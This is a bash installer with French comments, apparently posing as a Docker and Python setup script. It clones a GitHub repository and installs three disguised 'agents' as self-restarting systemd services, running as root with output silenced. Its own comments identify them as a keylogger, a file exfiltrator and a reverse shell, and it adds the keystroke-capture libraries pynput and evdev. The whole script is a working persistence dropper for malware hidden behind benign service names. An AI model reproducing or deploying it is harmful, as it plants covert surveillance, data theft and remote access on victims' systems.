#!/usr/bin/env bash
#
# install_all.sh
#
# Script qui installe :
#  - Python3, pip, Docker, git
#  - Dépendances Python (evdev, requests, etc.)
#  - 3 programmes "agents" depuis un dépôt GitHub
#  - Crée 3 services systemd, chacun se relance si tu les kill

# ----------------------------
#       CONFIGURATIONS
# ----------------------------

# Lien du dépôt GitHub à cloner (adapte à ton repo)
REPO_URL="https://github.com/YoubaDJAOUTI/install-docker.git"

# Noms des scripts tels que présents dans le dépôt
SCRIPT_1="net_monitor.py"
SCRIPT_2="sync_transfer.py"
SCRIPT_3="remote_connector.py"

# Chemin temporaire pour cloner le dépôt
TEMP_DIR="/tmp/install_agents_repo"

# Dossier d'installation final
INSTALL_DIR="/usr/local/bin"

# Noms "discrets" pour nos scripts installés
AGENT_1="net_monitor"         # ex: keylogger
AGENT_2="sync_transfer"       # ex: file exfil
AGENT_3="remote_connector"    # ex: reverse shell

# Noms des 3 services systemd
SERVICE_1="net-monitor.service"
SERVICE_2="sync-transfer.service"
SERVICE_3="remote-connector.service"

# Commande Python (souvent /usr/bin/python3)
PYTHON_CMD="/usr/bin/python3"


# ----------------------------
#      VÉRIFICATION ROOT
# ----------------------------
if [[ $EUID -ne 0 ]]; then
  echo "[!] Ce script doit être exécuté en root (sudo)."
  exit 1
fi

# ----------------------------
# 1) INSTALLATION PYTHON, PIP, GIT, DOCKER
# ----------------------------
echo "[*] Mise à jour des paquets et installation de Python3, pip, git et Docker..."
apt-get update -y && apt-get upgrade -y
apt-get install -y python3 python3-pip docker.io git

if [[ $? -ne 0 ]]; then
  echo "[!] Échec lors de l'installation de Python/pip/git/Docker."
  exit 1
fi

systemctl enable docker
systemctl start docker

# ----------------------------
# 2) INSTALLATION DÉPENDANCES PYTHON
# ----------------------------
echo "[*] Installation des dépendances Python..."
pip3 install --upgrade evdev requests pynput &> /dev/null

# ----------------------------
# 3) CLONAGE DU RÉPO GITHUB
# ----------------------------
echo "[*] Clonage du dépôt : $REPO_URL -> $TEMP_DIR"
rm -rf "$TEMP_DIR"
git clone "$REPO_URL" "$TEMP_DIR" &> /dev/null
if [[ $? -ne 0 ]]; then
  echo "[!] Échec du clonage du dépôt Git."
  exit 1
fi

# ----------------------------
# 4) DÉPLACEMENT / RENOMMAGE
# ----------------------------
echo "[*] Déplacement et renommage des scripts..."

# Script 1
if [[ -f "$TEMP_DIR/$SCRIPT_1" ]]; then
  mv "$TEMP_DIR/$SCRIPT_1" "$INSTALL_DIR/$AGENT_1"
  chmod +x "$INSTALL_DIR/$AGENT_1"
fi

# Script 2
if [[ -f "$TEMP_DIR/$SCRIPT_2" ]]; then
  mv "$TEMP_DIR/$SCRIPT_2" "$INSTALL_DIR/$AGENT_2"
  chmod +x "$INSTALL_DIR/$AGENT_2"
fi

# Script 3
if [[ -f "$TEMP_DIR/$SCRIPT_3" ]]; then
  mv "$TEMP_DIR/$SCRIPT_3" "$INSTALL_DIR/$AGENT_3"
  chmod +x "$INSTALL_DIR/$AGENT_3"
fi

# ----------------------------
# 5) CRÉATION DES SERVICES SYSTEMD
# ----------------------------
echo "[*] Création des services systemd..."

SERVICE_DIR="/etc/systemd/system"

# ----- Service 1 -----
cat <<EOF > "$SERVICE_DIR/$SERVICE_1"
[Unit]
Description=Network Monitor Agent
After=network.target

[Service]
Type=simple
ExecStart=$PYTHON_CMD $INSTALL_DIR/$AGENT_1
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

# ----- Service 2 -----
cat <<EOF > "$SERVICE_DIR/$SERVICE_2"
[Unit]
Description=Sync Transfer Agent
After=network.target

[Service]
Type=simple
ExecStart=$PYTHON_CMD $INSTALL_DIR/$AGENT_2
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

# ----- Service 3 -----
cat <<EOF > "$SERVICE_DIR/$SERVICE_3"
[Unit]
Description=Remote Connector Agent
After=network.target

[Service]
Type=simple
ExecStart=$PYTHON_CMD $INSTALL_DIR/$AGENT_3
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

# ----------------------------
# 6) ACTIVER ET DÉMARRER LES SERVICES
# ----------------------------
echo "[*] Activation et démarrage des 3 services..."
systemctl daemon-reload

systemctl enable "$SERVICE_1"
systemctl start "$SERVICE_1"

systemctl enable "$SERVICE_2"
systemctl start "$SERVICE_2"

systemctl enable "$SERVICE_3"
systemctl start "$SERVICE_3"

# ----------------------------
# 7) NETTOYAGE
# ----------------------------
echo "[*] Nettoyage : suppression du dossier $TEMP_DIR"
rm -rf "$TEMP_DIR"

echo "[+] Installation terminée. Les 3 services sont lancés et se relanceront en cas de kill."
